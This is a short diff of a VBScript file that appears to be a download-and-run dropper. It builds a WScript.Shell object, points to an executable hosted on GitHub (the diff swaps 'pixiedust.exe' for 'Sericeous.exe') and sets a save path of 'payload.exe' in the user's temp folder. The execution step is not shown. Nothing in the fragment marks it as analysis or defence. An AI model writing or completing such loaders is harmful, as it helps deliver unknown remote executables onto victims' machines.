@@ -2,7 +2,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 
 ' ✅ URL to your GitHub-hosted EXE
-url = "https://github.com/sfxjinxy/service/raw/refs/heads/main/pixiedust.exe"
+url = "https://github.com/sfxjinxy/service/raw/refs/heads/main/Sericeous.exe"
 
 ' ✅ Path to save EXE
 exePath = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.exe"
